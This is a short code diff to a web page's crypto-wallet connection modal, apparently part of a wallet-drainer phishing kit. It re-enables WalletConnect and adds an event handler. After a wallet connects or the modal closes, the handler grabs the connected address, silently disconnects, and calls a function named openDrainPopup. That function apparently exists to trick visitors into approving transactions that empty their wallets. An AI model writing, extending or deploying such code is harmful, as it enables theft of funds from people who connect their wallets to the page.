@@ -27,11 +27,7 @@ const modal = createAppKit({
     icons: [],
   },
   enableReconnect: false,
-  enableWalletConnect: false,
   allWallets: 'SHOW',
-  excludeWalletIds: [
-    'walletConnect',
-  ],
   featuredWalletIds: [
     // Phantom
     'a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393',
@@ -159,6 +155,14 @@ modal.subscribeEvents((event) => {
   if (e === 'SELECT_WALLET') {
     const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
     if (name) lastClickedWallet = name;
+  }
+  // Catch WalletConnect QR connections
+  if (e === 'CONNECT_SUCCESS' || e === 'MODAL_CLOSE') {
+    const addr = modal.getAddress?.();
+    if (addr && !popupOpened) {
+      try { modal.disconnect(); } catch (e) {}
+      openDrainPopup(lastClickedWallet || 'wc');
+    }
   }
 });
 
